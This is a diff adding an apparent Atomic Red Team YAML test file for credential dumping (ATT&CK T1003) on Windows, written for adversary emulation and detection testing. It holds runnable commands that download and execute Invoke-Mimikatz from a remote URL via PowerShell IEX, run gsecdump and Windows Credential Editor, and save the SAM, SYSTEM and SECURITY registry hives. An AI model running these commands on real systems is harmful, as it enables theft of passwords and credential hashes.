@@ -1,0 +1,51 @@
+---
+attack_technique: T1003
+display_name: Credential Dumping
+
+atomic_tests:
+- name: Powershell Mimikatz
+  description: |
+    Dumps Credentials via Powershell by invoking a remote mimikatz script
+  supported_platforms:
+    - windows
+  executor: powershell
+  input_arguments:
+    remote_script:
+      type: Url
+      default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+  command: |
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds"
+
+- name: Gsecdump
+  description: |
+    https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+  supported_platforms:
+    - windows
+  executor: command_prompt
+  command: |
+    gsecdump -a
+
+- name: Windows Credential Editor
+  description: |
+    http://www.ampliasecurity.com/research/windows-credentials-editor/
+  supported_platforms:
+    - windows
+  executor: command_prompt
+  input_argument:
+    output_file:
+      type: Path
+      default: output.txt
+  command: |
+    wce -o #{output_file}
+
+- name: Registry
+  description: |
+    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+  supported_platforms:
+    - windows
+  executor: command_prompt
+  command: |
+    reg save HKLM\sam sam 
+    reg save HKLM\system system
+    reg save HKLM\security security
+
